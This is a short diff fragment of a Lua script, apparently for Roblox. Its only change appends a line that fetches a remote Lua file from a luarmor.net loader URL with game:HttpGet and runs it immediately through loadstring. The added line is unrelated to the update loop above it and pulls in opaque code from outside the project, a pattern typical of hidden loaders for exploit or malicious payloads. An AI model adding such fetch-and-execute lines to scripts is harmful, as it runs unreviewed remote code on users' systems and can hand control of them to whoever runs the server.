@@ -230,3 +230,4 @@ task.spawn(function()
         task.wait(0.2) -- Reduce la frecuencia de actualización
     end
 end)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8ed487a4f3d5999246057f3bc8158ec1.lua"))()
